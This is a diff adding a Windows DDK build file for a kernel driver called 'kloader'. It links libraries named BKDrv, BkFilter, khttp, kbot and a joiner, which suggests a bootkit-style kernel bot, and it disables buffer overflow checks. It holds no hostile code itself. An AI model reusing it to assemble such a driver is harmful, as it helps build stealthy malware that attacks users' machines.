@@ -1,0 +1,41 @@
+TARGETNAME = kloader
+TARGETTYPE = DRIVER
+
+!IF $(FREEBUILD)
+TARGETPATH=..\bin\Release
+TARGETPATHLIB=..\lib\Release
+!ELSE
+TARGETPATH=..\bin\Debug
+TARGETPATHLIB=..\lib\Debug
+!ENDIF
+
+TARGETLIBS=\
+	$(DDK_LIB_PATH)\ndis.lib		\
+	$(TARGETPATHLIB)\*\BKLib.lib	\
+	$(TARGETPATHLIB)\*\BKDrv.lib	\
+	$(TARGETPATHLIB)\*\BkFilter.lib	\
+	$(TARGETPATHLIB)\*\FsLib.lib	\
+	$(TARGETPATHLIB)\*\DrvLdr.lib	\
+	$(TARGETPATHLIB)\*\KipLib.lib	\
+	$(TARGETPATHLIB)\*\lwip.lib		\
+	$(TARGETPATHLIB)\*\rtl.lib		\
+	$(TARGETPATHLIB)\*\khttp.lib	\
+	$(TARGETPATHLIB)\*\crypto.lib	\
+	$(TARGETPATHLIB)\*\kbot.lib	
+	
+
+INCLUDES=..\inc
+
+BUFFER_OVERFLOW_CHECKS=0
+C_DEFINES=$(C_DEFINES) /Gz
+
+!IF $(FREEBUILD)
+MSC_OPTIMIZATION = /O1 /Oi
+MSC_WARNING_LEVEL=/W3 /WX
+MSC_STDCALL = 1
+!ENDIF
+
+SOURCES=	kloader.c		\
+			joiner.c		\
+			stubs.c
+					
